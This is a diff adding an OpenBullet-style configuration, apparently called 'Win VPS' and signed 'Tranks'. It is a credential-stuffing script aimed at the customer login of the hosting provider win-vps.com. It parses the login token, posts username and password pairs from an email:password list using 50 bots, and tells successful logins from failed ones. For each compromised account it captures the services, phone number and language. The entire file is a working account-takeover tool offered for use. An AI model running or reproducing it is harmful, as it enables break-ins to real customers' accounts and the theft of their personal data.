@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Win VPS",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-06T21:57:15.9177396+02:00",
+  "AdditionalInfo": "",
+  "Author": "Tranks",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Try REQUEST GET "https://www.win-vps.com/clientarea.php?" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "https: //www.win-vps.com/clientarea.php?" 
+#Token PARSE "<SOURCE>" LR "name=\"token\" value=\"" "\" />" -> VAR "Token" 
+#Login REQUEST POST "https://www.win-vps.com/dologin.php" 
+  CONTENT "token=<Token>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "https: //www.win-vps.com/clientarea.php?" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "logout.php" 
+#Tranks_1 PARSE "<SOURCE>" LR "class=\"stat\">" "</div>" -> CAP "Services" 
+#Tranks_2 PARSE "<SOURCE>" LR "<div class=\"phone\">" "</div>" -> CAP "Phone" 
+#Tranks_3 PARSE "<SOURCE>" LR "<option selected=\"selected\">" "</option>" -> CAP "Lenguge" "" "   |By:Tranks" 
